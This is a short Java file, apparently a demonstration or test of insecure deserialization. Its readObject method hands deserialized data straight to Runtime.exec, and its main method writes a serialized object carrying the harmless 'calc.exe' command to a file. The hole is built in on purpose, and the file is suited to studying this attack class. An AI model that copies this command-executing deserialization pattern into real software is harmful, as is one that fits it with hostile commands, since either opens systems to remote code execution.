import java.io.*;


class VulnerableAction {
    public void executeCommand(String command) throws IOException {
        Runtime.getRuntime().exec(command);
    }
}


class TransientHolder implements Serializable {
    private static final long serialVersionUID = 1L;
    private transient String transientData;
    private VulnerableAction action;

    public TransientHolder(String data, VulnerableAction action) {
        this.transientData = data;
        this.action = action;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        this.transientData = (String) in.readObject();
        System.out.println("readObject called, transientData restored: " + this.transientData);
        action.executeCommand(this.transientData);
    }

    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
        out.writeObject(this.transientData);
    }
}

public class TestTransint {
    public static void main(String[] args) throws IOException {
        TransientHolder holder = new TransientHolder("calc.exe", new VulnerableAction());

        try (FileOutputStream fos = new FileOutputStream("transient_test.ser");
             ObjectOutputStream oos = new ObjectOutputStream(fos)) {
            oos.writeObject(holder);
        }

        System.out.println("Serialized data saved to transient_test.ser");
    }
}